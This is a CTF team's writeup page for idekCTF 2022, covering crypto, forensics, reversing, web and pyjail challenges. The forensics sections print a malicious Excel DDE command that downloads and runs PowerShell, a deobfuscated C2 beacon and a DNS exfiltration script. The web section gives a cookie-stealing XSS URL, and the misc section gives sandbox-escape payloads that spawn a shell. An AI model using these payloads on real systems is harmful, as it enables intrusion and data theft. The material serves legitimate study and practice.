@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>idekCTF 2022* Writeup | Black Bauhinia</title>
+
+<meta name="keywords" content="ctf" />
+<meta name="description" content="Our collection of writeups for idekCTF 2022*.">
+<meta name="author" content="botton, cire meat pop, fsharp, harrier, Hollow, J4cky, Kaiziron, LifeIsHard, Mystiz, ozetta, RaccoonNinja, TWY">
+<link rel="canonical" href="https://b6a.black/posts/2023-01-30-idekctf/" />
+<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
+    as="style">
+
+<link rel="icon" href="https://b6a.black/favicon.ico">
+
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.91.0" />
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-M67YZZ2MP1');
+</script>
+
+
+
+<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>
+
+
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 
+
+
+<meta property="og:title" content="idekCTF 2022* Writeup" />
+<meta property="og:description" content="Our collection of writeups for idekCTF 2022*." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b6a.black/posts/2023-01-30-idekctf/" />
+<meta property="article:published_time" content="2023-02-03T18:05:00+08:00" />
+<meta property="article:modified_time" content="2023-02-03T18:05:00+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="idekCTF 2022* Writeup"/>
+<meta name="twitter:description" content="Our collection of writeups for idekCTF 2022*."/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "idekCTF 2022* Writeup",
+  "name": "idekCTF 2022* Writeup",
+  "description": "Our collection of writeups for idekCTF 2022*.",
+  "keywords": [
+    "ctf"
+  ],
+  "articleBody": "Crypto Writeup for some other crypto challenges will be ready later.  Finite Realm of Random (4 solves) Solved by grhkm\nSecond blood.\nLet $L = \\mathbb{F}_{127^{32}}$ and $g$ be a fixed generator of $L$. The flag is splitted into character blocks and the following operation is performed:\n The block is encoded by $\\vec{c} = (c_0, c_1, \\ldots, c_{31}) \\mapsto f = c_0 + c_1g + c_2g^2 + \\cdots + c_{31}g^{31}$ For at most $5$ times:  Two elements $r_1$ and $r_2$ are chosen with the same minimal polynomial in $L$ Find a polynomial $\\varphi(X) \\in \\mathbb{F}_{127}[X]$ that satisfies $\\mathrm{deg}(\\varphi) \\leq 31$ and $\\varphi(r_1) = f$ Replace $f \\mapsto \\varphi(r_2)$   We receive the resulting $f$  Let’s first analyse the curious code in 2.1 by recalling the following fact.\nLemma: Let $L / K$ be a Galois extension. Then, the minimal polynomial of any $\\alpha \\in L \\setminus K$ is\n$$f(x) = \\prod_{\\sigma \\in \\mathrm{Gal}(L / K)} (x - \\sigma(\\alpha)).$$\n In other words, the roots to the minimal polynomial of $\\alpha$ are precisely the Galois conjugates of $\\alpha$. Applying this to our problem, we see that $r_2 = \\sigma(r_1)$ for some $\\sigma \\in \\mathrm{Gal}(L / K)$. Moreover, recall that the Galois group of a finite field is exactly the powers of the Froebnius automorphism:\n$$ \\mathrm{Gal}(\\mathbb{F}_{p^n} / \\mathbb{F}_p) = {\\mathrm{Frob}_p^i : 0 \\leq i Where $\\mathrm{Frob}_p$ is the map $x \\mapsto x^p$. Hence, $r_1$ and $r_2$ are Galois conjugates and we can write $r_2 = r_1^{p^k}$ for some $0 \\leq k Let’s move on to the rest of the algorithm. We now compute a polynomial that maps $r_1 \\mapsto f$ and see where $r_2$ maps to. With our new gained knowledge, this part is easy to figure out. In fact, since the field has characteristics $p$, we have the following fact:\nClaim: We have $\\varphi(r_2) = \\varphi(r_1)^{p^k}$.  Proof: We apply Freshman’s Dream. Writing $\\varphi(X) = \\sum_{i = 0}^{31} d_iX^i$, we have\n$$ \\begin{aligned} \\varphi(r_1)^{p^k} \u0026= \\left(\\sum_{i = 0}^{31} d_ir_1^i\\right)^{p^k} \\\\ \u0026= \\sum_{i = 0}^{31} \\left(d_ir_1^i\\right)^{p^k} \u0026\\text{Freshman’s dream} \\\\ \u0026= \\sum_{i = 0}^{31} d_ir_1^{ip^k} \\\\ \u0026= \\varphi\\left(r_1^{p^k}\\right) \\\\ \u0026= \\varphi(r_2) \\end{aligned} $$\nWhere the third line uses the fact that $d_i \\in \\mathbb{F}_{127}$, so $d_i^{p^k} = d_i$.\nWe are close to the end now. Since by definition, $\\varphi(r_1) = f$, we get that $\\varphi(r_2) = f^{p^k}$. In other words, step (2) in the original algorithm simply maps $f$ to one of its conjugates by $f \\mapsto f^{p^k}$. Therefore, to recover the original $f$, we simply look at all $32$ conjugates of the resulting $f$ and check if it is valid ASCII with the correct length.\nSolve script:\n# Curiously, random is not random L = GF(127) for i in range(5): L = L['x'].irreducible_element(2, algorithm='random').splitting_field(f't{i}') # Parses resulting f ct = bytes.fromhex(open('out.txt', 'r').read()) assert len(ct) % L.degree() == 0 blocks = [L(list(map(int, ct[i:i + L.degree()]))) for i in range(0, len(ct), L.degree())] def convert(poly): return bytes(map(int, poly.polynomial().coefficients())) for c in blocks: for i in range(32): # Checks conjugates by f - f^(p^i) r = bytes(vector(c^(127^i))) if all(32  t  127 or t == 0 for t in r): print(r.decode()) Forensics HiddenGem Mixtape Series Solved by TWY, Hollow, fsharp\n1: Initial Access (47 solves) An archive is given. It contains a Hyper-V virtual hard disk from the compromised computer of an employee and another archive which is password-protected. For this part, we are supposed to work with the provided hard disk only.\nThe challenge description states that the compromise occurred after an employee opened a document file received via email. When examining the hard disk, we should be on the lookout for a suspicious email or document.\nUsing AccessData FTK Imager, we add the virtual hard disk as an evidence item. Partition 1  KAPE  [root] is the part of the hard disk containing all the relevant data used for the Windows operating system. Navigating to C:\\Users\\IEUser\\Documents, we see an email named Policy Update 2023-01-08T01_37_35+07_00.eml. If we open it in a text editor, we could see that the email body and attached document are base64 encoded. The decoded body reads:\nWe have just completed the Security Baseline for employees and personal computers due to some information leaks, so it is necessary to update the company's information security policy. In order to ensure the Company's internal information security, I request you to read and master the content of the policy This is a confidential document, so it should be protected Password is Privacy4411@2023!!! Sent with Proton Mail secure email. The attached document is a 7z archive called Policy.7z. As stated by the email, its password is Privacy4411@2023!!!. Opening it shows a document called Policy.xlsx. Given the circumstances, the email and document found are likely the ones referred to by the challenge description.\nOne way of analyzing Microsoft Office documents is to open them as a zip archive. Going into xl\\externalLinks\\externalLink.xml, there is a suspicious line of XML:\n  xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:mc=\"http://schemas.openxmlformats.org/markup-compatibility/2006\" mc:Ignorable=\"x14\" xmlns:x14=\"http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" ddeService=\"cmd\" ddeTopic=\"/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\\\u0026quot;http://172.21.20.96/windowsupdate.ps1\\\u0026quot;);IEX $e\" name=\"_xlbgnm.A1\" advise=\"1\"/ name=\"StdDocumentName\" ole=\"1\" advise=\"1\"/ Dynamic Data Exchange (DDE) was used to execute malicious code when the document was opened by the employee. The code downloads a PowerShell script from the internet and executes it.\nThe hard disk unfortunately does not contain the downloaded script. However, it is still possible to discover what PowerShell code was executed by looking into Windows PowerShell event logs.\nReading C:\\Windows\\System32\\winevt\\logs\\Microsoft-Windows-PowerShell%4Operational.evtx and filtering for event ID 4104, there is one event that contains obfuscated PowerShell code. It is essentially:\n\u0026 ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )}) Deobfuscating it would reveal what commands were being run. The ( $sHEllid[1]+$sheLLiD[13]+'X') part evaluates to IEX, which is a shorthand for Invoke-Expression and is responsible for executing code. So, it is important to avoid triggering or including code snippets that evaluate to IEX or Invoke-Expression during deobfuscation.\nTo deobfuscate this code, open a PowerShell terminal and execute the part after ( $sHEllid[1]+$sheLLiD[13]+'X'). We get:\n(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL ' ', (|ConvERTtO-SecureSTRiNG -k 55,113,158,254,51,94,175,13,94,42,226,159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).GetneTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[21]+$psHOme[34]+'x') Run the part before |. ( $PsHoME[21]+$psHOme[34]+'x') to get:\n$bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);$s='172.21.20.96:8080';$i='eef8efac-321d465e-e9d053a7';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{\"X-680d-47e8\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/321d465e -Headers @{\"X-680d-47e8\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST -Headers @{\"X-680d-47e8\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8} What the deobfuscated script does are the following:\n A request is sent to http://172.21.20.96:8080/eef8efac with a custom header X-680d-47e8: eef8efac-321d465e-e9d053a7. A request is sent to http://172.21.20.96:8080/321d465e with the same custom header. If the received content is not empty, it is executed as PowerShell code, and any error and output is sent to http://172.21.20.96:8080/e9d053a7 with the custom header. Do nothing for 0.8 seconds. Repeat step 2.  172.21.20.96:8080 probably acted as a command-and-control (C2) server that tells compromised clients what commands to execute and exfiltrates information from them. Step 1 might have been used to tell the C2 server to begin sending commands to the client.\nThere is a suspicious variable named $flag that never gets used in the script. If we evaluate $bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);$bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99); and read the contents of $flag, we get a Pastebin URL that contains the flag and a webpage link explaining the kind of attack used by the document:\nidek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt} Resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within 3: The Ultimate Goal (14 solves) For this part, we need to use the packet capture in the password-protected archive in addition to the hard disk.\nContinuing our investigation, we could find 3 files containing RDP bitmap cache in C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache named Cache0000.bin, Cache0001.bin and Cache0002.bin.\nWe could extract the bitmaps from the cache with bmc-tools.py and piece them back together with RdpCacheStitcher. By doing so, we discover a link to a PowerShell script used for exfiltrating information from compromised computers.\nAccording to the .ps1 file obtained, we know that we should check the DNS traffic to recover the files leaked.\nDeobfuscated ps1 content with explanations:\n$d=\"172.21.20.96\"; $s=4; $b=57; Get-ChildItem \".\" | Foreach-Object { $a=[System.Convert]::ToBase64String($Enc.GetBytes($_.Name)); # RC4 $R={ $D,$K=$Args; $S=0..255;0..255|%{ $J=($J+$S[$_]+$K[$_%$K.Length])%256; $S[$_],$S[$J]=$S[$J],$S[$_] }; $D|%{ $I=($I+1)%256; $H=($H+$S[$I])%256; $S[$I],$S[$H]=$S[$H],$S[$I]; $_-bxor$S[($S[$I]+$S[$H])%256] } }; $Enc = [System.Text.Encoding]::ASCII; # key $p = $Enc.GetBytes('[System.IO.File]::ReadAllBytes($_.FullName)'); # data $z = $Enc.GetBytes([System.IO.File]::ReadAllBytes($_.FullName)); # $u = RC4(data=$z, key=$p) $u = (\u0026 $R $z $p); $e = [System.Convert]::ToBase64String($u); $l=$e.Length; # separated by . per $b characters $r=\"\"; $n=0; # blocks while ($n -le ($l/$b)) { # $c: content length $c=$b; # last block check if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + \".\"; # perform nslookup per $s blocks if (($n%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r=\"\" } $n=$n+1 } nslookup -type=A $r$a. $d } We export the related traffic to JSON (HiddenGem.json) beforehand.\nWireshark Filter: ip.dst == 172.21.20.96 \u0026\u0026 dns.id == 2\nThen we can recover all files using the below script:\nimport json, base64 from Crypto.Cipher import ARC4 from os import makedirs data = [ list(x['_source']['layers']['dns']['Queries'].values())[0]['dns.qry.name'] for x in json.loads(open(\"HiddenGem.json\").read()) ] files = {} for d in data: *content, rfn = d.split(\".\") fn = base64.b64decode(rfn).decode() files[fn] = files.get(fn, b'') + base64.b64decode(\"\".join(content).encode()) key = b'[System.IO.File]::ReadAllBytes($_.FullName)' makedirs(\"HiddenGem\", exist_ok=True) for fn in files: files[fn] = bytes(map(int, ARC4.new(key).decrypt(files[fn]).split(b\" \"))) open(\"HiddenGem/\" + fn, \"wb\").write(files[fn]) Check the file named SecretPlan.pdf. There is a table on the 2nd page:\nFrom there we obtained the flag: idek{RDP_Cache_1s_g0OD_bu7_1_h4t3_t4K1n9_t3x7_fr0M_Im4g3s}\nBTW: there is a file named update.ps1 with the same leaking mechanism with the above malicious script.\nReverse Polyglot (42 solves) Solved by TWY, fsharp\nThe binary given is a polyglot: It is both a valid AArch64 and x86_64 Linux program. The flag is split into two parts, and each part could be found by reverse engineering the binary as one of the two aforementioned program types.\nPart 1: AArch64 (solved by fsharp)\nThe program does the following:\nbinary = open(\"polyglot\", \"rb\").read(124) decoded = \"\" for i in range(28): xord = binary[i + 68] ^ binary[i + 96] decoded += chr(xord) It does not print the decoded string, so we need to decode it ourselves. We get idek{__Why_50_m4nY_4rch5_l1k as the first part of the flag.\nPart 2: x86_64 (solved by TWY)\nFor this part, it is actually not too difficult to read the decompiled code generated by Ghidra, but needs more effort to understand and reimlement the pointer logic if not executing the raw binary.\nManual Reimplementation\n# 0x85(v2, \u0026(binary[0x3a1] copied), 0x20) v5 = 0 v2 = list(binary[0x2a1:0x3a1]) # list(range(256)) v3 = binary[0x3a1:0x3c1] a2 = 0x20 for v4 in range(0x100): v6 = v2[v4] v5 = (v5 + v6 + v3[v4 % a2]) \u0026 255 v2[v4] = v2[v5] v2[v5] = v6 # 0x1a2(v2, \u0026(binary[0x3c1] copied), 0x17) v7 = list(binary[0x3c1:]) + list(binary[0x226:0x22e]) a1 = 0 for v7p in range(0x17): pv6 = (v7p + 1) \u0026 255 cv2 = v2[pv6] a1 = (a1 + cv2) \u0026 255 v2[pv6] = cv3 = v2[a1] v2[a1] = cv2 v7[v7p] ^= v2[(cv2 + cv3) \u0026 255] # result: v7 It is RC4 (again). (Check HiddenGem 3)\nComplete Solve Script:\nfrom Crypto.Cipher import ARC4 binary = open(\"polyglot\", \"rb\").read() flag1 = bytes([a ^ b for a, b in zip(binary[0x44:0x60], binary[0x60:0x7c])]) flag2 = ARC4.new(binary[0x3a1:0x3c1]).encrypt(binary[0x3c1:] + binary[0x226:0x22e]) print((flag1 + flag2).decode()) Flag: idek{__Why_50_m4nY_4rch5_l1k3_X86_N_4rM_1n_0n3_biN}\nWeb Readme (176 solves) Solved by fsharp, J4cky\nA Go script is provided. A 24576-byte buffer called randomData is filled with bytes generated from rand.Read(), and the SHA256 hash of idek is moved to index 12625 in the buffer. We could POST a JSON array called Orders to http://readme.chal.idek.team:1337/just-read-it, which contains at most 10 positive integers between 1 and 100.\nThe script reads, from randomData, the numbers of bytes specified by each integer in the Orders array. When the integer is between 1 and 99, the corresponding number of bytes are read. However, when the integer is 100, something strange happens: bufio.NewReader() is called on the reader variable before the read happens.\nThe goal is to get the script to read in exactly 12625 bytes.\nIt appears that at most 100 bytes could be read each time. We decided to do a little testing: By POSTing an array consisting of at least six 100s, we get an error that says failed to read: read error: EOF.\nWhat happened was that the bufio.NewReader() and read function calls together ended up reading in 4096 bytes instead of the expected 100. So, there is a way to read more than 100 bytes each time after all.\nBy doing some math, we could figure out what numbers to POST to read in exactly 12625 bytes:\n4096 + 4096 + 4096 + 99 + 99 + 99 + 40 = 12625\nSo, we POST {\"Orders\":[100,100,100,99,99,99,40]} and successfully get the flag: idek{BufF3r_0wn3rsh1p_c4n_b1t3!}\nSimpleFileServer (98 solves) Solved by RaccoonNinja, Kaiziron, fsharp; write-up by RaccoonNinja\nThe goal is to forge an admin cookie {\"admin\":true} and access /flag.\nThe key insight is that symlinks can be put in your zip. For sake of convenience I symlinked to / and we are getting whatever we want (as far as our permission goes).\nThere are 2 pieces of the puzzle:\n Time when the service was started. This is found in /tmp/server.log Offset. This is found in /app/config.py (kudos to Kaiziron for reminding us)  There are only 1000 possibilities which can be quickly bruteforced.\nPaywall (71 solves) Solved by ozetta; write-up by RaccoonNinja\nThe goal is to get the flag but somehow we need to prepend the string FREE to it. A useful tool is php’s php:// protocol, which supports a wide range of wrappers and filters for processing.\nA useful resource is synacktiv’s php filter chain generator. The payload can be generated with ease from python3 php_filter_chain_generator.py --chain 'FREE '.\nJSON Beautifier (15 solves) Solved by ozetta, RaccoonNinja; write-up by RaccoonNinja\nA purely client-side challenge! We have to send a self-XSS link to admin and steal his cookie.\nA few keypoints:\n  The sink is obviously:\neval(`beautified = ${output}`); This means we have to corrupt output, which is created from userJson.\n  strings up to 10 chars are accepted in space argument:   supplying ` gives easy string context bypass:   the entry point is definitely DOM-XSS: outputBox.innerHTML = `${output}`\n it’s limited by the strict CSP-Policy script-src 'unsafe-eval' 'self'; object-src 'none', meaning we cannot insert any script tag or inline events this narrows down the hunt to (do something) - set this.config.debug and this.config.ops.cols - trigger beautify - free eval (knowing the order and working in an organized way is essential)    A good candidate would to set global properties would be DOM clobbering. However, while any truthy value will work for debug, cols has to be poisoned as string, not the usual HTMLInputElement type. Ozetta did most researches on this part and continued to create the final payload\n (organized post CTF) A good resource by PortSwigger describes how the properties can be enumerated and after enumeration, only frameset:cols can be string (textarea:cols is number).  '    When the dom clobbering payload is loaded to the dom, we can invoke beautiful by loading main.js again\n '    We can apply our XSS payload (simplified post-CTF)\n [\u0026quot;`+(location=`https://XXXX/`+document.cookie)//\u0026quot;]    The whole thing should be in an iframe, which is injected as the first step.\n http://json-beautifier.chal.idek.team:1337/?json=%22%3Ciframe+srcdoc%3D%27%3Ctextarea+id%3Djson-input%3E%5B%26quot%3B%60%2B(location%3D%60https%3A%2F%2FXXXX%2F%60%2Bdocument.cookie)//%26quot%3B%5D%3C%2Ftextarea%3E%3Ciframe+name%3Dconfig+srcdoc%3D%26apos%3B%3Cframeset+id%3Ddebug%3E%3Cframeset+id%3Dopts+cols%3D%26quot%3B%60%26quot%3B%3E%26apos%3B%3E%3C%2Fiframe%3E%3Cscript+src%3Dstatic%2Fjs%2Fmain.js%3E%3C%2Fscript%3E%27%3E%22    Misc pyjail (22 solves) Solved by Hollow, LifeIsHard, TWY, J4cky; write-up by TWY\nThis challenge is a pyjail with the below forbidden characters and overrided global functions for eval:\nblocklist = ['.', '\\\\', '[', ']', '{', '}',':'] DISABLE_FUNCTIONS = [\"getattr\", \"eval\", \"exec\", \"breakpoint\", \"lambda\", \"help\"] DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS} In the first version, we have infinite eval allowed. Allowing neither . nor getattr means that we cannot use the method provided. However we can still modify or delete the attributes by setattr and delattr\nOur target is to execute /readflag \"giveflag\" which prints out the flag.\nOur payload:\nsetattr(__import__('__main__'),'blocklist',list()) __import__('os').system('/readflag giveflag') which works by removing the blocklist in main, then executing the shell command.\nFor Pyjail Revenge, there is only 1 trial with 3 more entries in the blocklist (\"blocklist\", \"globals\", compile\") which does not have any effect as we can use string concatenation (like \"glo\" + \"bals\") or abusing NFKD (like globᵃls) to bypass all use cases.\nWe did not dig much further on that during the competition.\nFlag: idek{9eece9b4de9380bc3a41777a8884c185}\nPost-mortem: We realized that DISABLE_FUNCTIONS is just a mask on the original builtins that we can delete to get back the original builtin functions.\nFlag for Pyjail Revenge:\nSample Payload:\nsetattr(license,'__dict__',globᵃls()),delattr(license,'breakpoint'),breakpoint() (Pdb) import os; os.system(\"bash\") $ /readflag giveflag idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!} idek{what_used_to_be_a_joke_has_now_turned_into_an_pyjail_escape.How_wonderful!}\nIntended Solution (by downgrade#0778):\n__import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c \"/readflag giveflag\" #%s'))) It works by overriding the shell code (and commenting out the url of the Easter Egg) used by the antigravity module to launch a browser (webbrowser module).\nManager Of The Year Series Solved by LifeIsHard, Mystiz\nPart 1 (14 solves) Challenge description\n Just another ML challenge\n In the source code, there are variables like X_train, y_train, X_test and y_test. We need to predict y_test and have a small enough RMSE. At first glance, it seems to be a Machine Learning challenge.\nData explanation\n X_train and X_test are independent features  temperature fuel_price cpi unemployment net_cost_price_in_thousands average_user_points average_critic_points average_items_sold_in_thousands   y_train and y_test are dependent variables, which is our target  revenue_in_thousands    However, we can notice some unusual parts from the source code.\n We can only get flag if our prediction can meet rmse , the threshold is unreasonably low and could hardly be achieved by ML. We got a lot of request limit (i.e. chances to test our prediction). We can send our predictions for at most 367 times, and we can know the RMSE value for our predictions.  Note: the request limit is written as n_days = 365 n_reqs_lim = n_days + 2    RMSE formula\n$$\\text{RMSE}=\\sqrt{\\frac{ \\sum_{i=1}^{N} (Predicted_i-Actual_i)^2}{N}}$$\nAssuming, if we only change our prediction for $i=1$ and keep our prediction for $i=2\\ \\text{to}\\ 365$ the same. We can get the two equations:\n$$ \\begin{aligned} \\color{#91f2f1}{\\text{RMSE}'}=\\sqrt{\\frac{(\\color{#91f2f1}{\\hat{y}'_0}-y_0)^2+(\\hat{y}_1-y_1)^2+…+(\\hat{y}_{365}-y_{365})^2}{N}} \\\\ \\color{#91f2f1}{\\text{RMSE}''}=\\sqrt{\\frac{(\\color{#91f2f1}{\\hat{y}''_0}-y_0)^2+(\\hat{y}_1-y_1)^2+…+(\\hat{y}_{365}-y_{365})^2}{N}} \\end{aligned} $$\nOnly the blueparts are different. By rearranging and subtracting one equation from the other, we can get the value of $y_0$ (i.e. the value that we need to “predict”).\n$$y_0=\\frac{(\\text{RMSE}'')^2N-(\\text{RMSE}')^2N-{\\hat{y}''_0}^2+{\\hat{y}'_0}^2}{2(\\hat{y}'_0-\\hat{y}''_0)}$$\nTo make it simpler, we can set\n first prediction: $\\hat{y}'_0=0$ second prediction: $\\hat{y}''_0=100$  $$y_0=\\frac{(\\text{RMSE}'')^2N-(\\text{RMSE}')^2N-{100}^2}{-200}$$\nWe can do the same for each data point. Then we can get the exact y_test value. We need $365+1$ requests to get the value for $365$ $y$-value, then use the last $1$ request to submit the correct values. This matches the request limit of n_reqs_lim = n_days + 2.\nNote: As the RMSE we get is not an exact value, we can make our “prediction” more precise by rounding the calculated value to 2 decimal places.\nSolve script idek2022_manager1_solve.py\nFlag: idek{595a8beb7d381e7f3a8b2d4c88fe8b9b}\nPart 2 (10 solves) Challenge description\n Yet another ML challenge\n The source code is pretty similar to Part 1.\nComparison\n    Part 1 Part 2     Check for data quality N/A test_data.min() = 0test_data.max()    Requirement rmse  rmse    Request limit 367 7000   Message Value of rmse is given Only know if mse  prev_mse    As the value of RMSE is not given, we cannot use the method in Part 1. However, the threshold is loosened and we can send more requests.\nIt is likely that this is NOT a ML challenge because the high request limit (7000). As we can have some information about the RMSE (higher or lower than the previous one), we can make some guesses and narrow the range of the correct value.\nWe only need the range to be , then we can take the middle value and be sure that the error for that $y_i$ is .\nMethod 1\n Use 2 attempts for a 50% range cut Takes 20 attempts for each data point (to make sure range ) Illustration  Correct value = 41.32 For row 1, rmse2  rmse1, value is closer to 0 (lower bound)  change upper bound, range becomes [0,50]   For row 2, rmse2 , value is closer to 50 (upper bound)  change lower bound, range becomes [25,50]   etc.        Bounds Range Request1 Request2     1 [0,100] 100 0 100   2 [0,50] 50 0 50   3 [25,50] 25 25 50   4 [37.5,50] 12.5 37.5 50   5 [37.5,43.75] 6.25 37.5 43.75   6 [40.625, 43.75] 3.125 40.625 43.75   7 [40.625, 42.1875] 1.5625 40.625 42.1875   8 [40.625, 41.40625] 0.78125 40.625 41.40625   9 [41.015625, 41.40625] 0.390625 41.015625 41.40625   10 [41.2109375, 41.40625] 0.1953125 41.2109375 41.40625   11 [41.30859375, 41.40625] 0.09765625 / /    Method 2\n We can save some attempts if either the lower/upper bound = previous request value Takes 11-20 attempts for each data point (to make sure range )  Depends on luck (where the number locate)   Illustration  Correct value = 41.32 For row 3, the previous request value is “50”, we can just request “25” and we will know whether “25” or “50” is closer to the correct value For row 6, the previous request value is “43.75” For row 7, the previous request value is “40.625” etc. In this case, we only need 16 attempts        Bounds Range Request1 Request2     1 [0,100] 100 0 100   2 [0,50] 50 0 50   3 [25,50] 25 25 -   4 [37.5,50] 12.5 37.5 50   5 [37.5,43.75] 6.25 37.5 43.75   6 [40.625, 43.75] 3.125 40.625 -   7 [40.625, 42.1875] 1.5625 - 42.1875   8 [40.625, 41.40625] 0.78125 40.625 41.40625   9 [41.015625, 41.40625] 0.390625 41.015625 -   10 [41.2109375, 41.40625] 0.1953125 41.2109375 41.40625   11 [41.30859375, 41.40625] 0.09765625 / /    Solve script idek2022_manager2_solve.py\nIn the above solve script, used Method 2. (Ran the code for 4 times, on average using 5616 requests to get the flag.)\nFlag: idek{25d3cc2f403ca5177f928b42af494050}\nFurther enhancement\n Change the range threshold (still 100% solve)  We require the range to be in the above solution However, the actual range when satisfying this situation will always be $100/2^{10}=0.09765625$ It means that we can set the threshold to be larger for some data points Let $x$ be the number of threshold $= 0.09765625$, then $$0.09765625x+0.1953125(365-x)206.736$$ We can set threshold $= 0.09765625$ for $207$ data points, and $0.1953125$ for $158$ data points (or $0.14$ and $0.28$, which will get the same result) Changes in code threshold = 0.14 if i  207 else 0.28 while bounds[1]-bounds[0]  threshold: ...  Result  Ran the code for 4 times, on average using 5353 requests to get the flag Can save ~260 requests     Use even larger range threshold (not 100% can solve)  We are using a “safe” threshold to make sure EVERY data point to have error In fact, the error won’t be exactly at the threshold for every data point For some data points, we will be luckier and have smaller error Then we can allow a larger room for error for the other data points (i.e. we can use even higher threshold in general) However, there will be a trade off between success rate and fewer requests    Niki (11 solves) Solved by fsharp, RaccoonNinja, TWY; write-up by RaccoonNinja\nA guessing misc challenge.\nThe manual was in German so I used an online service to translate it. After some trial-and-error with the procedures:\nWe assumed with high confidence:\n Only the letter-named functions are changed (change a few important letters) All letters will be placed on the board (i.e. the flag can be read directly) and do not overlap The main procedure’s lines but not their inner content are scrambled (the first line definitely won’t work)  There are only tiek()dspo left, as zero is not used in main.\nWe did solve the puzzle with very aggressive guessing, but apparently there were multiple solutions.\nBruteforcing all the possible anagrams (6) was also a viable option.\nPHPFu…n (10 solves) Solved by ozetta, TWY; write-up by TWY\nIn this challenge, we are only allowed to use [(,.^')] characters to execute arbitary PHP code.\nDue to the nature that the server reads the payload via /bin/bash, the length limit is thus restricted to 4096.\nGiven that we have ' characters to form strings, we can make use of PHP operator ^ (xor) on strings to obtain more characters to build the payload.\nBy checking the ASCII values of the given characters (All within the range of [0x28, 0x2f] ∪ [0x58, 0x5f] with all lower bits available), it indicates that we can only produce characters in the range of [0x00, 0x07] ∪ [0x28, 0x2f] ∪ [0x58, 0x5f] ∪ [0x70, 0x77].\nThere is another trick in PHP that we can use the syntax \"func_name\"(a, b) to evaluate funcname(a, b), which means we can call functions if the function name can be built using the provided characters.\nRunning a simple check against get_defined_functions()[\"internal\"] reveals that there are only 3 function names satisfying the criteria: sqrt, strstr, and strtr.\nNotice that sqrt requires an integer (or a string comprising only digits), strtr takes strings and outputs only a string with the characters already in the arguments (producing no new characters). Since we do not have usable digit at this point, we can only rely on the remaining function, strstr. strstr can accept two strings as argument, and return a string if the 2nd argument is a substring of the 1st argument or false if not.\nHaving false as return type means we can get a number 0 at this point by false ^ false = 0.\nHere is the note on generating the character 0:\n# strings in double quote means they are generated are should be replaced by the corresponding code \"s\": '['^'(' \"t\": ')'^']' \"r\": ','^'^' \"strstr\": (\"s\").(\"t\").(\"r\").(\"s\").(\"t\").(\"r\") false: (\"strstr\")('',',') 0: false^false \"0\": (0).'' As the ascii value of ‘0’ is 0x30, which means now 64 characters can be generated:\n[0x00, 0x07] ∪ [0x18, 0x1f] ∪ [0x28, 0x37] ∪ [0x40, 0x47] ∪ [0x58, 0x5f] ∪ [0x68, 0x77]\nThis includes digits from 0 to 7 and all letters (case insensitive) can be generated. Noticeably, letters h to w is in lower case and all others are in upper case. Importantly, s and h are both in lower case.\nAt this point, we can already get the shell:\n\"Y\": '['^','^'.' \"E\": '['^'.'^\"0\" \"h\": 